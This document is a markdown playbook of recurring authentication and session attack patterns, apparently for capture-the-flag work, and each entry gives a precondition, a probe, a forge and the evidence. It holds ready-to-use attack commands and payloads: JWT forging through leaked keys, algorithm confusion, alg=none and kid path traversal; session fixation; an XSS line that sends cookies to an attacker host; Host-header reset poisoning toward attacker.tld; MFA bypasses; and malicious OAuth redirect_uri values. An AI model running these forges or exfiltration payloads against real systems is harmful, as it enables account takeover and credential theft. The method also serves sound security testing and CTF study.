# Solved patterns — the auth-session shapes that recur

The reusable solutions. Each pattern names the precondition, the probe,
the forge, and the evidence that counted.

---

## Pattern: leaked-signing-key → forge

**Precondition**: any signing/encryption key reachable — `.env`,
`config.py`, `settings.py`, `secrets.yml`, `credentials.yml.enc`,
`master.key`, `app.js` (`secret:'...'`), bundle, `git log`, file-read.

**Probe**: `session_dissect --token T` names the format. `session_dissect
--try-keys` recovers an HMAC key offline; a leaked key skips the crack.

**Forge**: `jwt_forge.py --token T --secret <key> --claims '{"role":"admin"}'`
(JWT) or `flask-unsign --sign --cookie '{"_user_id":1}' --secret <key>`.

**Evidence**: the forged token replayed on a protected endpoint returns
the flag path — `http_probe --evidence-kind impact --on-match confirms`.

**Variants**: JWT secret, Flask `SECRET_KEY`, Django `SECRET_KEY`, Rails
`secret_key_base`, Laravel `APP_KEY`, Express `connect.sid` secret,
gorilla `securecookie` hash/block keys, .NET `MachineKey`, any JWS key.

## Pattern: alg-confusion

**Precondition**: token `alg` is `RS*`/`ES*`/`Ed*` and the public key is
reachable — `/.well-known/jwks.json`, `/oauth/jwks`, `/pubkey.pem`, a
JWT payload `jwk`, or the key inside source.

**Probe**: `session_dissect` shows asymmetric; fetch the pubkey.

**Forge**: `jwt_forge --token T --claims ... --pubkey pubkey.pem` —
signs HS256 with the public key as the HMAC secret.

**Evidence**: a protected endpoint that accepts the HS token (it
verifies with the pubkey, which IS the HMAC secret it just used).

## Pattern: alg=none

**Precondition**: verifier uses `jwt.decode(t)` without a verify, or a
library that honors `alg=none`.

**Probe**: `jwt_forge --token T --claims '{"role":"admin"}' --alg ''` —
the trailing-dot token.

**Evidence**: protected endpoint accepts. If it rejects, the verifier
checks the signature — move on.

## Pattern: header-injection (kid/jku/x5u)

**Precondition**: the token header carries `kid`, `jku`, or `x5u`.

**Probe**: `jwt_forge --token T --kid ../../../../dev/null --kid-secret ''`
or `--jku https://you/jwks.json`.

**Evidence**: protected endpoint accepts — the `kid` resolved to a file
you control, or `jku` fetched your JWK.

## Pattern: predictable session id

**Precondition**: the id is sequential, `md5(sha1(user+time))`, `uuid v1`,
or a weak PRNG output.

**Probe**: `session_dissect --token <id>` names the entropy. `id_sweep`
enumerates a range.

**Forge**: recompute the id for a known target (admin's login time from
`/api/users/1/last_login` or a guess).

**Evidence**: replay the predicted id → another user's session.

## Pattern: session fixation

**Precondition**: the app accepts a client-supplied `?sid=`, or the
login page issues a sid pre-auth that's reused post-auth.

**Probe**: `GET /login?sid=EVIL` → does `Set-Cookie: sid=EVIL` echo?

**Forge**: plant `https://t.tld/login?sid=EVIL` → victim logs in →
replay `sid=EVIL`.

**Evidence**: `EVIL` session now carries the victim's identity.

## Pattern: hijack via missing-HttpOnly + XSS

**Precondition**: `HttpOnly` not set AND an XSS sink exists.

**Probe**: inspect `Set-Cookie` — no `HttpOnly` flag. Find the XSS
(`web-xss`).

**Forge**: `<script>fetch('//you/'+document.cookie)</script>` → steal.

**Evidence**: replayed cookie yields the victim's session.

## Pattern: unbound reset token

**Precondition**: `/forgot` issues a token not bound to the email.

**Probe**: trigger `/forgot` for `victim@`, capture the token `T` —
then `POST /reset {token:T, email:mine@, password:new}`.

**Evidence**: `mine@`'s password is now `new` — login as `mine` → flag
in their data.

## Pattern: predictable reset token

**Precondition**: token is sequential, timestamp, `md5(email)`, or a
weak PRNG output.

**Probe**: `session_dissect --token T` on a real reset token names the
format.

**Forge**: recompute for `victim@` → `POST /reset {token:<forged>,...}`.

**Evidence**: password reset → login.

## Pattern: Host-header reset poisoning

**Precondition**: the reset URL is built from the `Host` header.

**Probe**: `POST /forgot {email:victim@}` with `Host: attacker.tld` →
does the link become `https://attacker.tld/reset?token=T`?

**Forge**: victim clicks → token lands in your access log.

**Evidence**: replay the stolen token → login as victim.

## Pattern: mass-assign role field

**Precondition**: registration or update endpoint binds every body field.

**Probe**: `POST /register {...,"role":"admin"}` or `POST /profile
{"role":"admin"}`.

**Evidence**: `GET /api/me` returns `"role":"admin"` → access admin
surface.

## Pattern: registration-race

**Precondition**: the `users` table canonicalizes email but has no
unique constraint, OR the canonicalization is non-deterministic.

**Probe**: `race_probe --write-ack` on `POST /register` with the same
canonical email.

**Evidence**: two users with the same canonical email → the second
registration's session may resolve to the first's account.

## Pattern: MFA step-skip

**Precondition**: the post-password, pre-MFA session carries enough
authz to reach a protected endpoint.

**Probe**: login with password → capture the intermediate cookie/token
→ request `/api/me` or `/flag` directly, skipping `/mfa`.

**Evidence**: the endpoint returns the flag — the MFA gate is only
on the login *form*, not the session.

## Pattern: MFA code falsy

**Precondition**: the verifier does loose/falsy checking on `code`.

**Probe**: `POST /mfa {code:"000000"}` or `code=""`, `code=null`,
`code=false`, `code=[]`.

**Evidence**: empty/null/false bypasses — `if not code` or `code ==
stored` where stored is empty.

## Pattern: MFA device-trust

**Precondition**: `remember_device`/`trusted_device` cookie or flag
exists, settable without MFA.

**Probe**: register/login → set `remember_device=true` → log out →
login → MFA skipped?

**Evidence**: the device-cookie bypasses the second factor.

## Pattern: OAuth state CSRF

**Precondition**: `state` param absent or not checked on the callback.

**Probe**: initiate OAuth → capture the callback URL with `code` →
craft a page that redirects the victim's browser to YOUR callback
(attacker's code).

**Evidence**: victim's session gets bound to attacker's account — or
victim's code replayed binds their account.

## Pattern: OAuth redirect_uri loose

**Precondition**: `redirect_uri` validated by prefix/substring/domain.

**Probe**: `redirect_uri=https://t.tld.evil.tld/cb` or
`redirect_uri=https://t.tld/cb/../evil` or `redirect_uri=https://evil.tld@t.tld/cb`.

**Evidence**: the provider accepts → token/code delivered to attacker
origin.

## Pattern: service-token aud confusion

**Precondition**: two token families (user vs service), `aud` unchecked.

**Probe**: mint a service token (`aud=internal`, `sub=service`), replay
on the user API.

**Evidence**: the user API accepts — the `sub=service` grants service
scope which is admin.

## Pattern: impersonation endpoint

**Precondition**: `/su`, `/switch_user`, `?_switch_user=`, `/impersonate`,
`/become`, `X-Switch-User` exists.

**Probe**: `GET /admin/su?user=admin` or `POST /impersonate {user:admin}`
as a low-priv user.

**Evidence**: the response is the admin's session — or a new cookie
for the admin.

## Pattern: second-order session

**Precondition**: a privileged bot logs in / a stored claim renders /
an async job processes a queued session.

**Probe**: store a payload in a field that reaches the bot's session
or the job's token.

**Evidence**: the bot's session/action carries the flag back — the
steal is on the second hop, not the first.

## The falsifier for every pattern

The protected endpoint returns `401`/`403` to the forged token. Every
pattern's evidence line is the *same* — the flag (or admin data) read
from a live response after the forged/replayed/stolen credential. If
that never happens, the pattern is dead for this target — record the
negative and move.
